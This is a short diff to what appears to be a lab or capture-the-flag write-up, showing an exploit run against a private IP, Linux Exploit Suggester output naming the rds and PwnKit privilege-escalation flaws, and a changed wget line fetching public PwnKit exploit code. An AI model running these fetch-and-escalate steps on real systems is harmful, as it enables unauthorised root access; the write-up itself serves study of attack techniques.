@@ -319,8 +319,9 @@ php 18083.php 192.168.207.41 /test/
 ╔══════════╣ Executing Linux Exploit Suggester
 ╚ https://github.com/mzet-/linux-exploit-suggester  
 [+] [CVE-2010-3904] rds
+[+] [CVE-2021-4034] PwnKit
 
-wget http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
+wget <https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.zip>
 
 ```
 ### Nukem
